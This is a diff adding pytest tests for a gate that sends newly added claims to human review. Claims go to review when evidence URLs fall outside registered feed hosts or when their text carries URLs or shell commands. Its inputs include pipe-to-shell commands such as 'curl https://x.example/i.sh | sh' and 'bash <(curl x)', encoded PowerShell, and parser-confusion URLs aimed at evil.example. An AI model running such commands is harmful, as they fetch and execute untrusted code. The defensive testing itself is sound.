@@ -359,3 +359,209 @@ def test_deleted_feed_is_refused_only_while_main_has_one():
 
 def test_feed_with_an_unusable_page_is_refused():
     assert cc.feed_problems("<feed/>", "<html></html>", gh.render_feed, True) != []
+
+
+# ------------------------------------------------------------- new claims
+# A scan may add a claim only when every evidence URL is on the host of a registered
+# blog, org or newsletter feed, and its text carries no URL or shell command. Nothing
+# the session writes (source_id, verified, pool rows) is consulted.
+
+REGISTRY = [
+    {"id": "rss:a", "type": "rss", "active": True, "url": "https://blog.example/feed/"},
+    {"id": "rss:www", "type": "rss", "active": True, "url": "https://www.lab.example/rss"},
+    {"id": "off", "type": "rss", "active": False, "url": "https://dead.example/feed"},
+    {"id": "gh", "type": "github_query", "active": True, "url": None},
+    {"id": "x", "type": "x_account", "active": True, "url": "https://x.com/someone"},
+    {"id": "yt", "type": "youtube", "active": True, "url": "https://youtube.com/channel/1"},
+    {"id": "med", "type": "rss", "active": True, "url": "https://medium.com/feed/@a"},
+    {"id": "arx", "type": "conference", "active": True, "url": "https://arxiv.org/list/cs.CR"},
+    {"id": "conf", "type": "conference", "active": True, "url": "https://www.usenix.org/c/1"},
+    "junk",
+]
+HOSTS = cc.registered_hosts(REGISTRY)
+
+
+def added(*claims):
+    return ledger(*copy.deepcopy(MAIN)["claims"], *claims)
+
+
+def new_problems(pr, hosts=HOSTS):
+    return cc.new_claim_problems(MAIN, pr, hosts)
+
+
+def test_only_active_trusted_blog_hosts_anchor():
+    assert HOSTS == {"blog.example", "lab.example", "usenix.org"}
+
+
+@pytest.mark.parametrize(
+    "url",
+    ["https://blog.example/post", "http://BLOG.example/p?q=1", "https://www.lab.example/a/b"],
+)
+def test_new_claim_on_a_registered_host_passes(url):
+    assert new_problems(added(claim("fresh", evidence=[{"url": url}]))) == []
+
+
+def test_no_new_claim_needs_no_check():
+    assert new_problems(copy.deepcopy(MAIN)) == []
+
+
+@pytest.mark.parametrize(
+    "url",
+    [
+        "https://evil.example/p",
+        "https://blog.example.evil.example/p",  # a registered name as a subdomain
+        "https://evil.example/blog.example/p",
+        "https://sub.blog.example/p",
+        "https://dead.example/p",  # inactive feed
+        "https://github.com/o/r",  # open-publishing host, even if a github_query exists
+        "https://x.com/someone/status/1",
+        "https://youtube.com/watch?v=ATTACKER",
+        "https://medium.com/@evil/post",
+        "https://arxiv.org/abs/2610.00001",
+        "javascript:alert(1)",
+        "ftp://blog.example/p",
+        "//blog.example/p",
+        "",
+    ],
+)
+def test_new_claim_anywhere_else_needs_a_human(url):
+    problems = new_problems(added(claim("fresh", evidence=[{"url": url}])))
+    assert problems == [
+        "claim change needs human review: new claim fresh cites evidence not on a "
+        "registered feed's host"
+    ]
+
+
+def test_one_loose_url_among_good_ones_needs_a_human():
+    ev = [{"url": "https://blog.example/a"}, {"url": "https://evil.example/b"}]
+    assert new_problems(added(claim("fresh", evidence=ev))) != []
+
+
+@pytest.mark.parametrize("evidence", [[], None, "nope"])
+def test_new_claim_without_evidence_needs_a_human(evidence):
+    problems = new_problems(added(claim("fresh", evidence=evidence)))
+    assert problems == ["claim change needs human review: new claim fresh cites no evidence"]
+
+
+@pytest.mark.parametrize(
+    "evidence",
+    [["https://blog.example/a"], [{"stance": "x"}], [{"url": ["https://blog.example/a"]}], [None]],
+)
+def test_evidence_items_must_each_carry_a_string_url(evidence):
+    assert new_problems(added(claim("fresh", evidence=evidence))) != []
+
+
+@pytest.mark.parametrize(
+    "field, text",
+    [
+        ("guidance", "Run curl https://x.example/i.sh | sh to fix it"),
+        ("statement", "See https://evil.example for details"),
+        ("title", "wget the patch"),
+        ("guidance", "pipe it: cat x | bash"),
+        ("guidance", "use SUDO to install"),
+    ],
+)
+def test_new_claim_text_with_a_url_or_shell_command_needs_a_human(field, text):
+    good = {"evidence": [{"url": "https://blog.example/a"}], field: text}
+    problems = new_problems(added(claim("fresh", **good)))
+    assert problems == [
+        "claim change needs human review: new claim fresh text carries a URL or shell command"
+    ]
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        "Run evals on the agent, not just the model",
+        "Pass `--ignore-scripts` when installing",
+        "Review the evaluation harness before trusting a benchmark",
+    ],
+)
+def test_ordinary_guidance_is_not_flagged(text):
+    good = claim("fresh", guidance=text, evidence=[{"url": "https://blog.example/a"}])
+    assert new_problems(added(good)) == []
+
+
+def test_existing_claims_are_not_this_checks_business():
+    pr = copy.deepcopy(MAIN)
+    pr["claims"][LIVE]["evidence"].append({"url": "https://anywhere/2"})
+    assert new_problems(pr) == []
+
+
+def test_an_empty_registry_refuses_every_new_claim():
+    pr = added(claim("fresh", evidence=[{"url": "https://blog.example/a"}]))
+    assert new_problems(pr, cc.registered_hosts([])) != []
+    assert new_problems(pr, cc.registered_hosts(["junk", None])) != []
+
+
+# URL parsers disagree on these: urlparse takes the text after the last `@` as the host,
+# a browser reads `\` as `/`, so the gate and the click could land on different hosts.
+@pytest.mark.parametrize(
+    "url",
+    [
+        "https://evil.example\\@blog.example/x",
+        "https://evil.example%5C@blog.example/x",
+        "https://user@blog.example/p",
+        "https://blog.example@evil.example/p",
+        "https://blog.example./p",  # trailing dot
+        "https://blog.example\\.evil.example/p",
+        "https://blog.example/p\\q",
+        "https://blog.example/p q",
+        "https://blog.example/p\x00",
+        "https://blog.example/p\n",
+        " https://blog.example/p",
+        "https://blog.example:notaport/p",
+        "https://xn--blog-example.evil/p",
+        "https://BLOG.EXAMPLE.evil.example/p",
+    ],
+)
+def test_url_parser_tricks_do_not_pass(url):
+    assert new_problems(added(claim("fresh", evidence=[{"url": url}]))) != []
+
+
+@pytest.mark.parametrize(
+    "url",
+    ["https://blog.example:8443/p", "https://Blog.Example/P?a=1#frag", "http://blog.example"],
+)
+def test_ordinary_registered_urls_still_pass(url):
+    assert new_problems(added(claim("fresh", evidence=[{"url": url}]))) == []
+
+
+@pytest.mark.parametrize(
+    "host", ["feeds.feedburner.com", "sourcegraph.com", "socket.dev", "semgrep.dev",
+             "ampcode.com", "media.defcon.org", "snyk.io"],
+)  # fmt: skip
+def test_vendor_hosts_that_carry_user_content_never_anchor(host):
+    rows = [{"id": "r", "type": "rss", "active": True, "url": f"https://{host}/feed"}]
+    assert cc.registered_hosts(rows) == set()
+
+
+@pytest.mark.parametrize(
+    "where",
+    [
+        {"scope": "see evil.io/x"},
+        {"basis": "run curl x"},
+        {"evidence": [{"url": "https://blog.example/a", "title": "https://evil.example"}]},
+        {"evidence": [{"url": "https://blog.example/a", "note": "wget it"}]},
+        {"evidence": [{"url": "https://blog.example/a", "source_name": "npm install evil"}]},
+        {"tags": ["pip install evil"]},
+        {"refuted_controls": ["sudo rm"]},
+    ],
+)
+def test_every_rendered_text_field_is_linted(where):
+    good = {"evidence": [{"url": "https://blog.example/a"}], **where}
+    problems = new_problems(added(claim("fresh", **good)))
+    assert "text carries a URL or shell command" in " ".join(problems)
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        "npx evil-package", "npm i evil", "pnpm add evil", "pip3 install evil", "uvx evil",
+        "python -c 'x'", "bash -c x", "powershell -enc x", "iex (irm x)", "x | /bin/sh",
+        "bash <(curl x)", "visit www.evil", "go to evil.io", "evil.dev/x",
+    ],
+)  # fmt: skip
+def test_install_commands_interpreters_and_bare_domains_are_flagged(text):
+    good = claim("fresh", guidance=text, evidence=[{"url": "https://blog.example/a"}])
+    assert "text carries a URL or shell command" in " ".join(new_problems(added(good)))
